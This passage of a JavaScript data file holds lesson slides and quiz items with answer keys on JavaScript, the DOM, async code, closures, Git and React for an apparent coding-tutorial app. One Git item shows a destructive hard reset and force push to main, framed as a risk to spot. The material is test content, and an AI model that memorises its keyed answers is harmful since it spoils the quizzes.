          { difficulty: "advanced", type: "output", q: "What are the values of a, b, and c?", code: "const a = 0 || 'hello';\nconst b = '' ?? 'default';\nconst c = null ?? 'fallback';", options: ["'hello', 'default', 'fallback'", "'hello', '', 'fallback'", "0, '', null", "'hello', 'default', null"], answer: 1 },
        ]
      },
      {
        title: "Functions & Arrays",
        slides: [
          { type: "teach", content: "**Arrow functions** `const add = (a, b) => a + b;` are concise and don't have their own `this`. They're the modern way to write functions.", highlight: "Arrow functions" },
          { type: "teach", content: "The Big 3 array methods: **map** (transform each item), **filter** (keep matching items), **reduce** (accumulate to single value). Master these!", highlight: "map, filter, reduce" },
        ],
        questions: [
          { q: "What does .map() return?", options: ["A boolean", "A new array of same length", "A single value", "undefined"], answer: 1 },
          { q: "Which method keeps only items that pass a test?", options: ["map", "reduce", "filter", "find"], answer: 2 },
          { q: "Arrow functions use which syntax?", options: ["function() {}", "=> {}", "def()", "fn()"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "What does this code output?", code: "const nums = [1, 2, 3, 4, 5];\nconst result = nums\n  .filter(n => n % 2 === 0)\n  .map(n => n * 10);\nconsole.log(result);", options: ["[10, 20, 30, 40, 50]", "[20, 40]", "[10, 30, 50]", "[2, 4]"], answer: 1 },
          { difficulty: "average", type: "output", q: "What does reduce return here?", code: "const words = ['Hello', ' ', 'World'];\nconst result = words.reduce(\n  (acc, word) => acc + word, ''\n);\nconsole.log(result);", options: ["['Hello', ' ', 'World']", "Hello World", "HelloWorld", "Hello , World"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the array chain to get names of adults:", code: "const people = [\n  { name: 'Alice', age: 25 },\n  { name: 'Bob', age: 17 },\n  { name: 'Carol', age: 30 }\n];\n\nconst adultNames = people\n  .___BLANK1___(p => p.age >= 18)\n  .___BLANK2___(p => p.name);", blanks: [{ id: "BLANK1", options: ["map", "filter", "reduce", "find"], answer: 1 }, { id: "BLANK2", options: ["filter", "map", "reduce", "forEach"], answer: 1 }] },
          // Advanced
          { difficulty: "advanced", type: "freeform", q: "Implement a function `groupBy(arr, key)` that groups an array of objects by a given key. Example: groupBy([{type:'a', v:1}, {type:'b', v:2}, {type:'a', v:3}], 'type') should return {a: [{type:'a',v:1},{type:'a',v:3}], b: [{type:'b',v:2}]}", starterCode: "const groupBy = (arr, key) => {\n  \n};", patterns: ["reduce|forEach|for", "\\[key\\]|\\[item\\[key\\]\\]|\\[curr\\[key\\]\\]", "return"], sampleAnswer: "const groupBy = (arr, key) => {\n  return arr.reduce((groups, item) => {\n    const group = item[key];\n    groups[group] = groups[group] || [];\n    groups[group].push(item);\n    return groups;\n  }, {});\n};" },
          { difficulty: "advanced", type: "output", q: "What is the difference between these two approaches?", code: "const arr = [1, 2, 3];\n\n// Approach A\narr.forEach(n => console.log(n * 2));\n\n// Approach B\nconst doubled = arr.map(n => n * 2);", options: ["No difference — both return a new array", "forEach returns undefined (side effects only); map returns a new array", "map modifies the original array; forEach doesn't", "forEach is async; map is sync"], answer: 1 },
          { difficulty: "advanced", type: "output", q: "What does this code output?", code: "const add = (a) => (b) => a + b;\nconst add5 = add(5);\nconsole.log(add5(3));\nconsole.log(add(10)(20));", options: ["8, 30", "5, 10", "undefined, undefined", "Error — functions can't return functions"], answer: 0 },
        ]
      },
      {
        title: "DOM & Events",
        slides: [
          { type: "teach", content: "The **DOM** (Document Object Model) is the browser's tree representation of your HTML. JavaScript can read and modify it using methods like **querySelector**.", highlight: "DOM" },
          { type: "teach", content: "**Events** are things that happen: clicks, key presses, form submissions. Use **addEventListener** to respond to them. This is how you make pages interactive!", highlight: "Events" },
        ],
        questions: [
          { q: "querySelector('.card') selects:", options: ["All cards", "The first matching .card element", "The last card", "Card by ID"], answer: 1 },
          { q: "Which method attaches an event handler?", options: ["onClick()", "addEventListener()", "attachEvent()", "bindEvent()"], answer: 1 },
          { q: "event.preventDefault() is used to:", options: ["Delete an element", "Stop default browser behavior", "Create an event", "Style an element"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "What happens when the button is clicked?", code: "const btn = document.querySelector('#myBtn');\nconst counter = document.querySelector('#count');\nlet clicks = 0;\n\nbtn.addEventListener('click', () => {\n  clicks++;\n  counter.textContent = clicks;\n});", options: ["Nothing happens", "The page refreshes", "The #count element shows the running click count", "An alert appears"], answer: 2 },
          { difficulty: "average", type: "fill", q: "Complete the DOM manipulation code:", code: "const title = document.___BLANK1___('#title');\ntitle.___BLANK2___ = 'New Title';\ntitle.style.color = 'red';", blanks: [{ id: "BLANK1", options: ["getElement", "querySelector", "findElement", "selectNode"], answer: 1 }, { id: "BLANK2", options: ["innerHTML", "textContent", "value", "text"], answer: 1 }] },
          { difficulty: "average", type: "output", q: "What does querySelectorAll return vs querySelector?", code: "const one = document.querySelector('.item');\nconst all = document.querySelectorAll('.item');\nconsole.log(one);    // ???\nconsole.log(all);    // ???", options: ["Both return arrays", "one: first matching Element, all: NodeList of all matches", "one: string, all: array of strings", "Both return the same thing"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "freeform", q: "Write an event-delegated click handler on a <ul> that handles clicks on any <li> child, even ones added later. Log the clicked item's text.", starterCode: "const list = document.querySelector('#todo-list');\n\n// Add event delegation here:\n", patterns: ["addEventListener.*click", "event\\.target|e\\.target", "tagName|matches|closest", "textContent|innerText"], sampleAnswer: "const list = document.querySelector('#todo-list');\n\nlist.addEventListener('click', (e) => {\n  if (e.target.tagName === 'LI') {\n    console.log(e.target.textContent);\n  }\n});" },
          { difficulty: "advanced", type: "output", q: "What is the performance issue with this code?", code: "const items = document.querySelectorAll('.item');\n// 1000 items on the page\n\nitems.forEach(item => {\n  item.addEventListener('click', (e) => {\n    console.log(e.target.textContent);\n  });\n});", options: ["querySelectorAll is slow", "1000 event listeners waste memory — use event delegation on parent instead", "forEach doesn't work on NodeList", "textContent is deprecated"], answer: 1 },
          { difficulty: "advanced", type: "order", q: "Arrange the steps to safely create and insert a new DOM element:", lines: ["const el = document.createElement('div');", "el.textContent = 'Hello World';", "el.classList.add('card');", "el.setAttribute('data-id', '42');", "document.querySelector('#container').appendChild(el);"], correctOrder: [0, 1, 2, 3, 4] },
        ]
      }
    ]
  },
  {
    id: 5, title: "Advanced JS", icon: "\u{1F680}", color: "#9B59B6", desc: "ES6+ & Async",
    lessons: [
      {
        title: "Async/Await & Promises",
        slides: [
          { type: "teach", content: "**Promises** represent future values: pending \u2192 fulfilled or rejected. **async/await** is cleaner syntax for working with promises.", highlight: "async/await" },
          { type: "teach", content: "Always wrap await calls in **try/catch** for error handling. Use **Promise.all()** to run multiple async operations in parallel.", highlight: "try/catch" },
        ],
        questions: [
          { q: "A Promise can be in which states?", options: ["start/stop/error", "pending/fulfilled/rejected", "open/closed", "sync/async"], answer: 1 },
          { q: "async/await is syntactic sugar for:", options: ["Callbacks", "Promises", "Loops", "Variables"], answer: 1 },
          { q: "Promise.all() runs promises:", options: ["One at a time", "In parallel", "In reverse", "Only if first succeeds"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "What does this code output, and in what order?", code: "console.log('1');\n\nsetTimeout(() => console.log('2'), 0);\n\nPromise.resolve().then(() => console.log('3'));\n\nconsole.log('4');", options: ["1, 2, 3, 4", "1, 4, 3, 2", "1, 4, 2, 3", "4, 3, 2, 1"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the async function with error handling:", code: "async function fetchUser(id) {\n  ___BLANK1___ {\n    const res = ___BLANK2___ fetch(`/api/users/${id}`);\n    const data = await res.json();\n    return data;\n  } catch (err) {\n    console.error('Failed:', err);\n  }\n}", blanks: [{ id: "BLANK1", options: ["if", "try", "while", "switch"], answer: 1 }, { id: "BLANK2", options: ["return", "yield", "await", "async"], answer: 2 }] },
          { difficulty: "average", type: "output", q: "What does this code log?", code: "async function getData() {\n  const result = await Promise.all([\n    Promise.resolve(1),\n    Promise.resolve(2),\n    Promise.resolve(3),\n  ]);\n  console.log(result);\n}\ngetData();", options: ["1", "[1, 2, 3]", "3", "Promise { [1, 2, 3] }"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "output", q: "What is the difference between Promise.all and Promise.allSettled?", code: "const promises = [\n  Promise.resolve('OK'),\n  Promise.reject('FAIL'),\n  Promise.resolve('OK2'),\n];\n\n// Promise.all(promises)     → ???\n// Promise.allSettled(promises) → ???", options: ["Both return all results", "all: rejects immediately on first failure. allSettled: waits for all, returns status of each", "all: slower. allSettled: faster", "all: returns array. allSettled: returns object"], answer: 1 },
          { difficulty: "advanced", type: "freeform", q: "Write a retry function that attempts an async operation up to 3 times with exponential backoff (1s, 2s, 4s delays) before giving up.", starterCode: "async function retry(fn, maxRetries = 3) {\n  \n}", patterns: ["async|await", "for|while|retry|attempt", "catch|reject", "delay|setTimeout|sleep|wait", "throw|reject"], sampleAnswer: "async function retry(fn, maxRetries = 3) {\n  for (let attempt = 0; attempt < maxRetries; attempt++) {\n    try {\n      return await fn();\n    } catch (err) {\n      if (attempt === maxRetries - 1) throw err;\n      const delay = Math.pow(2, attempt) * 1000;\n      await new Promise(r => setTimeout(r, delay));\n    }\n  }\n}" },
          { difficulty: "advanced", type: "order", q: "Arrange these async operations to fetch user data, then their posts, then comments on the first post — sequentially:", lines: ["const user = await fetch('/api/user/1').then(r => r.json());", "const posts = await fetch(`/api/users/${user.id}/posts`).then(r => r.json());", "const comments = await fetch(`/api/posts/${posts[0].id}/comments`).then(r => r.json());", "console.log({ user, posts, comments });"], correctOrder: [0, 1, 2, 3] },
        ]
      },
      {
        title: "Closures & Modules",
        slides: [
          { type: "teach", content: "A **closure** is a function that remembers variables from its outer scope, even after that scope has finished. It's how we create private state in JavaScript.", highlight: "closure" },
          { type: "teach", content: "**ES Modules**: use `export` to share code and `import` to use it. **Named exports** for utilities, **default export** for main classes/components.", highlight: "ES Modules" },
        ],
        questions: [
          { q: "A closure gives a function access to:", options: ["Global variables only", "Its outer scope's variables", "All files", "The DOM"], answer: 1 },
          { q: "Which is a named export?", options: ["export default User", "export { formatDate }", "module.exports", "require()"], answer: 1 },
          { q: "Closures are useful for creating:", options: ["HTML elements", "Private state/data encapsulation", "CSS animations", "Database tables"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "What does this code output?", code: "function makeCounter() {\n  let count = 0;\n  return {\n    increment: () => ++count,\n    getCount: () => count,\n  };\n}\n\nconst counter = makeCounter();\ncounter.increment();\ncounter.increment();\ncounter.increment();\nconsole.log(counter.getCount());", options: ["0", "1", "3", "undefined"], answer: 2 },
          { difficulty: "average", type: "fill", q: "Complete the ES module syntax:", code: "// math.js\n___BLANK1___ function add(a, b) { return a + b; }\n___BLANK1___ function subtract(a, b) { return a - b; }\n\n// main.js\n___BLANK2___ { add, subtract } from './math.js';", blanks: [{ id: "BLANK1", options: ["module", "export", "public", "share"], answer: 1 }, { id: "BLANK2", options: ["require", "include", "import", "load"], answer: 2 }] },
          { difficulty: "average", type: "output", q: "What does this closure-based code log?", code: "function greet(greeting) {\n  return function(name) {\n    return `${greeting}, ${name}!`;\n  };\n}\n\nconst sayHello = greet('Hello');\nconst sayHi = greet('Hi');\nconsole.log(sayHello('Alice'));\nconsole.log(sayHi('Bob'));", options: ["Hello, Alice! and Hi, Bob!", "undefined, undefined", "Hello, Bob! and Hi, Alice!", "Error — can't return functions"], answer: 0 },
          // Advanced
          { difficulty: "advanced", type: "output", q: "What does this code output? (Classic closure interview question)", code: "for (var i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i), 100);\n}\n\nfor (let j = 0; j < 3; j++) {\n  setTimeout(() => console.log(j), 200);\n}", options: ["0 1 2, then 0 1 2", "3 3 3, then 0 1 2", "0 1 2, then 3 3 3", "3 3 3, then 3 3 3"], answer: 1 },
          { difficulty: "advanced", type: "freeform", q: "Implement a memoize function using closures. It should cache results of expensive function calls and return cached results for repeated arguments.", starterCode: "function memoize(fn) {\n  \n}", patterns: ["cache|memo|map|store|results", "return\\s+function|=>", "cache\\[|cache\\.get|cache\\.has|Map", "return.*cache|return.*result"], sampleAnswer: "function memoize(fn) {\n  const cache = new Map();\n  return function(...args) {\n    const key = JSON.stringify(args);\n    if (cache.has(key)) return cache.get(key);\n    const result = fn.apply(this, args);\n    cache.set(key, result);\n    return result;\n  };\n}" },
          { difficulty: "advanced", q: "What is the key difference between named exports and default exports for tree-shaking?", options: ["Default exports are always tree-shaken", "Named exports enable tree-shaking because bundlers can track individual imports; default exports import the whole module", "There is no difference for tree-shaking", "Tree-shaking only works with CommonJS require()"], answer: 1 },
        ]
      }
    ]
  },
  {
    id: 6, title: "Git", icon: "\u{1F500}", color: "#F05032", desc: "Version Control",
    lessons: [
      {
        title: "Git Essentials",
        slides: [
          { type: "teach", content: "Git tracks changes to your code over time. The core workflow: **add** (stage changes) \u2192 **commit** (save snapshot) \u2192 **push** (upload to remote).", highlight: "add, commit, push" },
          { type: "teach", content: "**Branches** let you work on features without affecting the main code. Create with `git checkout -b feature/name`, then **merge** back when done.", highlight: "Branches" },
        ],
        questions: [
          { q: "What does `git add .` do?", options: ["Commits all files", "Stages all changes", "Pushes to remote", "Creates a branch"], answer: 1 },
          { q: "Branches are used to:", options: ["Delete code", "Work on features in isolation", "Speed up the server", "Design UI"], answer: 1 },
          { q: "The correct workflow order is:", options: ["commit, add, push", "push, commit, add", "add, commit, push", "commit, push, add"], answer: 2 },
          // Average
          { difficulty: "average", type: "output", q: "What is the state of 'hello.js' after these commands?", code: "git init\necho 'console.log(\"hi\")' > hello.js\ngit add hello.js\ngit commit -m \"first commit\"\necho 'console.log(\"bye\")' >> hello.js\ngit status", options: ["hello.js is fully committed with both lines", "hello.js shows as modified (unstaged) — the second line was not added/committed", "hello.js is untracked", "hello.js is staged and ready to commit"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the commands to undo a staged file without losing changes:", code: "git add mistake.js\n# Oops, didn't mean to stage that\ngit ___BLANK1___ ___BLANK2___ mistake.js", blanks: [{ id: "BLANK1", options: ["reset", "revert", "rm", "checkout"], answer: 0 }, { id: "BLANK2", options: ["--hard", "--soft", "HEAD", "--force"], answer: 2 }] },
          { difficulty: "average", q: "What is the difference between `git diff` and `git diff --staged`?", options: ["No difference, they show the same output", "`git diff` shows unstaged changes; `git diff --staged` shows staged changes ready to commit", "`git diff` shows committed history; `git diff --staged` shows remote changes", "`git diff --staged` only works on new files"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "order", q: "Arrange the steps to recover a file accidentally committed with secrets:", lines: ["git rm --cached .env", "Add .env to .gitignore", "git add .gitignore", "git commit -m \"Remove .env from tracking\"", "Rotate the exposed secrets/keys immediately", "Force push if already pushed to remote"], correctOrder: [4, 0, 1, 2, 3, 5] },
          { difficulty: "advanced", type: "freeform", q: "Write a .gitignore file for a Node.js project that excludes: dependencies, environment files, build output, OS files, editor configs, and log files. Add comments explaining each section.", starterCode: "# Node.js .gitignore\n", patterns: ["node_modules", "\\.env", "dist|build", "\\.DS_Store|Thumbs", "\\.log|logs", "#.*comment|#.*section|#.*dependencies"], sampleAnswer: "# Node.js .gitignore\n\n# Dependencies\nnode_modules/\n\n# Environment variables\n.env\n.env.local\n.env.production\n\n# Build output\ndist/\nbuild/\n\n# OS files\n.DS_Store\nThumbs.db\n\n# Editor configs\n.vscode/\n.idea/\n\n# Logs\n*.log\nnpm-debug.log*" },
          { difficulty: "advanced", q: "You ran `git commit --amend` and changed the message. What happened to the original commit?", options: ["It still exists in the history as a separate commit", "It was replaced — amend rewrites the last commit with a new SHA hash", "It was moved to a backup branch", "Nothing changed; amend only edits the message in place without changing the hash"], answer: 1 },
        ]
      },
      {
        title: "Branching & Merging",
        slides: [
          { type: "teach", content: "**Feature branches** isolate new work from the main codebase. Name them descriptively: `feature/login`, `fix/navbar-bug`, `chore/update-deps`.", highlight: "Feature branches" },
          { type: "teach", content: "**Merge conflicts** happen when two branches edit the same lines. Git marks the conflict with `<<<<<<<` and `>>>>>>>` \u2014 you choose which version to keep.", highlight: "Merge conflicts" },
        ],
        questions: [
          { type: "order", q: "Arrange the steps to create and merge a feature branch:", lines: ["git checkout -b feature/login", "# write your code changes", "git add . && git commit -m \"feat: login\"", "git checkout main && git merge feature/login"], correctOrder: [0, 1, 2, 3] },
          { q: "What does `git checkout -b new-branch` do?", options: ["Deletes a branch", "Creates and switches to a new branch", "Merges two branches", "Pushes to remote"], answer: 1 },
          { type: "fill", q: "Complete the merge command:", code: "git checkout main\ngit ___BLANK1___ feature/login", blanks: [{ id: "BLANK1", options: ["push", "merge", "pull", "delete"], answer: 1 }] },
          // Average
          { difficulty: "average", type: "output", q: "You see this output after running `git merge feature/signup`. What happened?", code: "Auto-merging src/auth.js\nCONFLICT (content): Merge conflict in src/auth.js\nAutomatic merge failed; fix conflicts and then commit the result.", options: ["The merge completed successfully", "Git deleted the conflicting file", "Both branches edited src/auth.js in the same location — you must manually resolve the conflict", "The feature branch was deleted"], answer: 2 },
          { difficulty: "average", type: "fill", q: "Complete the commands to resolve a merge conflict:", code: "# After a failed merge, edit the conflicting file, then:\ngit ___BLANK1___ src/auth.js\ngit ___BLANK2___ -m \"resolve merge conflict\"", blanks: [{ id: "BLANK1", options: ["push", "merge", "add", "reset"], answer: 2 }, { id: "BLANK2", options: ["merge", "push", "commit", "checkout"], answer: 2 }] },
          { difficulty: "average", q: "What is the difference between `git merge` and `git rebase`?", options: ["They are identical", "Merge creates a merge commit preserving history; rebase replays commits on top of the target for a linear history", "Rebase is only for deleting branches", "Merge only works on remote branches"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "output", q: "What does this conflict marker mean and which version should you keep?", code: "<<<<<<< HEAD\nconst API_URL = 'https://api.prod.com';\n=======\nconst API_URL = 'https://api.staging.com';\n>>>>>>> feature/staging\n\n// Context: you are merging feature/staging INTO main\n// for a production release", options: ["Keep the staging URL since it is the newer change", "Keep the prod URL (HEAD/main) since this is a production release", "Delete both and write a new URL", "Git automatically picks the correct version"], answer: 1 },
          { difficulty: "advanced", type: "freeform", q: "Write the Git commands for a complete rebase workflow: you are on feature/dashboard, main has new commits, and you want to rebase your branch onto the latest main before creating a PR.", starterCode: "# Starting on feature/dashboard branch\n", patterns: ["git checkout main|git switch main", "git pull", "git checkout feature|git switch feature", "git rebase main", "git push.*force|git push.*-f"], sampleAnswer: "# Starting on feature/dashboard branch\ngit checkout main\ngit pull origin main\ngit checkout feature/dashboard\ngit rebase main\n# Resolve any conflicts, then:\n# git add . && git rebase --continue\ngit push --force-with-lease origin feature/dashboard" },
          { difficulty: "advanced", q: "Why is `git push --force-with-lease` preferred over `git push --force` after a rebase?", options: ["It is faster", "It checks that the remote branch hasn't been updated by someone else, preventing overwriting their work", "It only works on feature branches", "There is no difference between the two commands"], answer: 1 },
        ]
      },
      {
        title: "Git Workflow & Collaboration",
        slides: [
          { type: "teach", content: "**Pull Requests** (PRs) let teammates review your code before merging. They're the backbone of professional team collaboration on GitHub.", highlight: "Pull Requests" },
          { type: "teach", content: "The **fork-and-PR** workflow: fork a repo, clone your fork, create a branch, push changes, then open a PR to the original repo. This is how open source works!", highlight: "fork-and-PR" },
        ],
        questions: [
          { q: "A Pull Request is used to:", options: ["Download a repo", "Request code review before merging", "Delete a branch", "Install dependencies"], answer: 1 },
          { q: "What does `git pull` do?", options: ["Pushes local changes", "Fetches and merges remote changes", "Creates a pull request", "Deletes remote branch"], answer: 1 },
          { type: "output", q: "What happens when you run this?", code: "git stash\n# switch to another branch, do work\ngit stash pop", options: ["Deletes your changes permanently", "Saves changes temporarily, then restores them", "Creates a new commit", "Pushes to remote"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "What does this Git log output tell you about the project's workflow?", code: "$ git log --oneline --graph\n* e4f5g6h (HEAD -> main) Merge pull request #12\n|\\  \n| * c3d4e5f (origin/feature/cart) feat: add shopping cart\n| * a1b2c3d feat: cart component layout\n|/  \n* 9z8y7x6 Merge pull request #11\n...", options: ["They use direct commits to main", "They use a feature-branch + PR workflow with merge commits", "They use rebase-only workflow", "The repository is corrupted"], answer: 1 },
          { difficulty: "average", type: "order", q: "Arrange the fork-and-PR open source contribution workflow:", lines: ["Fork the repository on GitHub", "Clone your fork locally", "Create a feature branch", "Make changes, commit, and push to your fork", "Open a Pull Request to the original repo", "Respond to code review feedback"], correctOrder: [0, 1, 2, 3, 4, 5] },
          { difficulty: "average", q: "Your teammate pushed new commits to the same branch you are working on. What should you do before pushing?", options: ["Force push your changes", "Run `git pull --rebase` to replay your commits on top of their changes", "Delete the remote branch and recreate it", "Ignore their changes and push anyway"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "freeform", q: "Write a set of Git commands to cherry-pick a specific bugfix commit from a release branch into main without merging the entire branch. Include the verification step.", starterCode: "# The bugfix commit hash is abc1234 on release/v2.0\n", patterns: ["git checkout main|git switch main", "git cherry-pick", "abc1234", "git log|git show|git diff"], sampleAnswer: "# The bugfix commit hash is abc1234 on release/v2.0\ngit checkout main\ngit pull origin main\ngit cherry-pick abc1234\n# Resolve conflicts if any, then:\n# git add . && git cherry-pick --continue\ngit log --oneline -3  # Verify the cherry-picked commit appears\ngit push origin main" },
          { difficulty: "advanced", q: "Your team debates between merge commits and squash-and-merge for PRs. What is the key tradeoff?", options: ["No difference — both produce identical history", "Merge commits preserve full branch history (easier debugging); squash merges create a cleaner linear log (but lose individual commit detail)", "Squash is always better because it reduces repo size", "Merge commits are only for open source projects"], answer: 1 },
          { difficulty: "advanced", type: "output", q: "A developer runs these commands. What is the risk?", code: "git checkout main\ngit reset --hard HEAD~3\ngit push --force origin main", options: ["No risk — this is a standard workflow", "This rewrites shared history on main, permanently removing 3 commits for all collaborators", "This only affects the local repository", "Git will prevent this automatically"], answer: 1 },
        ]
      }
    ]
  },
  {
    id: 7, title: "React", icon: "\u269B\uFE0F", color: "#61DAFB", desc: "Frontend Framework",
    lessons: [
      {
        title: "Components & JSX",
        slides: [
          { type: "teach", content: "React builds UIs from **components** \u2014 reusable pieces that return **JSX** (HTML-like syntax in JavaScript). Think of them as custom LEGO bricks.", highlight: "components" },
          { type: "teach", content: "**Props** pass data DOWN from parent to child. They're read-only \u2014 a child can never modify its own props. This keeps data flow predictable.", highlight: "Props" },
        ],
        questions: [
          { q: "React components are:", options: ["Server scripts", "Reusable UI building blocks", "Database models", "CSS frameworks"], answer: 1 },
          { q: "Props flow in which direction?", options: ["Child to parent", "Parent to child (down)", "Sideways", "Both ways"], answer: 1 },
          { q: "JSX lets you write ___ inside JavaScript.", options: ["SQL", "HTML-like syntax", "CSS animations", "Python"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "What does this component render?", code: "function Greeting({ name, isLoggedIn }) {\n  return (\n    <div>\n      {isLoggedIn ? (\n        <h1>Welcome back, {name}!</h1>\n      ) : (\n        <h1>Please sign in</h1>\n      )}\n    </div>\n  );\n}\n\n<Greeting name=\"Alice\" isLoggedIn={false} />", options: ["Welcome back, Alice!", "Please sign in", "An error because isLoggedIn is not a string", "Both messages are displayed"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the component that renders a list of items:", code: "function ItemList({ items }) {\n  return (\n    <ul>\n      {items.___BLANK1___(item => (\n        <li ___BLANK2___={item.id}>{item.name}</li>\n      ))}\n    </ul>\n  );\n}", blanks: [{ id: "BLANK1", options: ["forEach", "map", "filter", "reduce"], answer: 1 }, { id: "BLANK2", options: ["id", "class", "key", "name"], answer: 2 }] },
          { difficulty: "average", q: "Why must React components return a single root element (or use a Fragment)?", options: ["It is just a style preference", "JSX is transpiled to function calls — each element becomes a React.createElement() call, and a function can only return one value", "Multiple roots cause CSS conflicts", "Browsers cannot parse multiple root elements"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "freeform", q: "Create a reusable Button component that accepts: variant ('primary' | 'secondary'), size ('sm' | 'md' | 'lg'), disabled, onClick, and children. Apply different CSS classes based on props.", starterCode: "function Button({ }) {\n  return (\n    \n  );\n}", patterns: ["variant", "size", "disabled", "onClick", "children", "className|class"], sampleAnswer: "function Button({ variant = 'primary', size = 'md', disabled = false, onClick, children }) {\n  const className = `btn btn-${variant} btn-${size} ${disabled ? 'btn-disabled' : ''}`;\n  return (\n    <button\n      className={className}\n      onClick={onClick}\n      disabled={disabled}\n    >\n      {children}\n    </button>\n  );\n}" },
          { difficulty: "advanced", type: "output", q: "What is the bug in this component and how does it manifest?", code: "function UserList({ users }) {\n  return (\n    <ul>\n      {users.map((user, index) => (\n        <li key={index}>\n          <input defaultValue={user.name} />\n        </li>\n      ))}\n    </ul>\n  );\n}\n// Users can be reordered or deleted", options: ["No bug — index keys are fine", "Using index as key causes input values to stick to wrong items when the list is reordered or items are deleted", "The defaultValue prop does not work on inputs", "The map function cannot return JSX"], answer: 1 },
          { difficulty: "advanced", q: "When should you split a component into smaller sub-components?", options: ["Always split every element into its own component", "When a component handles multiple responsibilities, is hard to test, or has reusable parts", "Only when the file exceeds 500 lines", "Never — large components are more performant"], answer: 1 },
        ]
      },
      {
        title: "State & Hooks",
        slides: [
          { type: "teach", content: "**useState** creates reactive data. When state changes, React re-renders the component. `const [count, setCount] = useState(0);`", highlight: "useState" },
          { type: "teach", content: "**useEffect** handles side effects: API calls, event listeners, timers. It runs after render. Return a cleanup function to avoid memory leaks.", highlight: "useEffect" },
        ],
        questions: [
          { q: "useState returns:", options: ["Just the value", "An array with [value, setter]", "A promise", "An object"], answer: 1 },
          { q: "When state changes, React:", options: ["Refreshes the whole page", "Re-renders the component", "Crashes", "Does nothing"], answer: 1 },
          { q: "useEffect is used for:", options: ["Styling", "Side effects like API calls", "Creating HTML", "Defining routes"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "What does clicking the button display?", code: "function Counter() {\n  const [count, setCount] = useState(0);\n\n  function handleClick() {\n    setCount(count + 1);\n    setCount(count + 1);\n    setCount(count + 1);\n  }\n\n  return <button onClick={handleClick}>{count}</button>;\n}\n// User clicks the button once", options: ["3", "1 — state updates are batched and all three read the same stale 'count' value (0)", "0 — setCount does not work inside functions", "An error is thrown"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the useEffect that fetches data on mount and cleans up:", code: "useEffect(() => {\n  const controller = new AbortController();\n  fetch('/api/users', { signal: controller.signal })\n    .then(res => res.json())\n    .then(data => setUsers(data));\n\n  return () => controller.___BLANK1___();\n}, [___BLANK2___]);", blanks: [{ id: "BLANK1", options: ["cancel", "abort", "stop", "destroy"], answer: 1 }, { id: "BLANK2", options: ["users", "null", "", "undefined"], answer: 2 }] },
          { difficulty: "average", type: "output", q: "How many times does the useEffect callback run?", code: "function Profile({ userId }) {\n  const [user, setUser] = useState(null);\n\n  useEffect(() => {\n    fetch(`/api/users/${userId}`)\n      .then(r => r.json())\n      .then(setUser);\n  }, [userId]);\n\n  return <div>{user?.name}</div>;\n}\n// Component renders 5 times but userId\n// only changes twice (A -> B -> B -> B -> C)", options: ["5 times — once per render", "3 times — once on mount and once for each unique userId change (A, B, C)", "1 time — only on mount", "0 times — dependency array prevents execution"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "freeform", q: "Write a custom hook called useDebounce that takes a value and delay, returning the debounced value. It should update only after the user stops changing the value for 'delay' milliseconds.", starterCode: "function useDebounce(value, delay) {\n  \n}", patterns: ["useState", "useEffect", "setTimeout|clearTimeout", "return.*debounced|return.*value", "delay"], sampleAnswer: "function useDebounce(value, delay) {\n  const [debouncedValue, setDebouncedValue] = useState(value);\n\n  useEffect(() => {\n    const timer = setTimeout(() => {\n      setDebouncedValue(value);\n    }, delay);\n\n    return () => clearTimeout(timer);\n  }, [value, delay]);\n\n  return debouncedValue;\n}" },
          { difficulty: "advanced", type: "output", q: "What is the bug in this component?", code: "function SearchResults() {\n  const [query, setQuery] = useState('');\n  const [results, setResults] = useState([]);\n\n  useEffect(() => {\n    fetch(`/api/search?q=${query}`)\n      .then(r => r.json())\n      .then(data => setResults(data));\n  }, [query]);\n\n  return (\n    <input onChange={e => setQuery(e.target.value)} />\n  );\n}", options: ["No bug — this works correctly", "Race condition: fast typing fires many requests, and a slow earlier response can overwrite a newer correct result", "useEffect cannot make fetch calls", "The dependency array should be empty"], answer: 1 },
          { difficulty: "advanced", q: "When should you use useReducer instead of useState?", options: ["Always — useReducer is the modern replacement for useState", "When state logic is complex with multiple sub-values, or when the next state depends on the previous state in non-trivial ways", "Only when building Redux-like stores", "useReducer is only for form handling"], answer: 1 },
        ]
      },
      {
        title: "Routing & State Management",
        slides: [
          { type: "teach", content: "**React Router** enables navigation between pages without full page reloads. Use `<Route path='/about' element={<About />} />`.", highlight: "React Router" },
          { type: "teach", content: "For global state: **Context API** for simple needs, **Zustand** for medium apps, **Redux Toolkit** for complex apps. **React Query** handles server state.", highlight: "global state" },
        ],
        questions: [
          { q: "React Router enables:", options: ["Database access", "Client-side navigation", "CSS animations", "Testing"], answer: 1 },
          { q: "For simple global state, use:", options: ["Redux", "Context API", "GraphQL", "jQuery"], answer: 1 },
          { q: "React Query is best for managing:", options: ["CSS themes", "Server/API state with caching", "Form inputs", "Animations"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "What renders when the URL is '/users/42'?", code: "<Routes>\n  <Route path=\"/\" element={<Home />} />\n  <Route path=\"/users\" element={<UserList />} />\n  <Route path=\"/users/:id\" element={<UserProfile />} />\n  <Route path=\"*\" element={<NotFound />} />\n</Routes>", options: ["Home component", "UserList component", "UserProfile component with id param = '42'", "NotFound component"], answer: 2 },
